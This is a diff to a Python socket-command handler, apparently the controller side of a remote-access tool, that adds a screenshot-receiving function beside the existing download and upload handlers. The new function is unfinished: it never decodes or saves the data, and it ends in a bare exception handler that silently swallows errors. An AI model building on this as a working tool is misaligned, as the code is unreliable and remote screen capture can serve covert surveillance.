@@ -1,6 +1,6 @@
 from socket_handlers import socket_recv, socket_send
 from termcolor import colored
-import os, ast, base64
+import os, ast, base64, binascii
 
 
 def handle_download(client_socket, command) -> bool:
@@ -195,3 +195,21 @@ def handle_upload(client_socket, command) -> bool:
         error_msg = f"Error: Unexpected error during upload - {str(e)}"
         print(colored(error_msg, "red"))
         return False
+
+
+def handle_screenshot(client_socket, save_path="screenshot.png"):
+
+    try:
+        data = socket_recv(client_socket)
+
+        if data.startswith("[!] Error"):
+            print(colored(data, "red"))
+            return False
+
+        if not data:
+            error_msg = "[!] Error: Received empty screenshot data"
+            print(colored(error_msg, "red"))
+            return False
+
+    except Exception as e:
+        pass
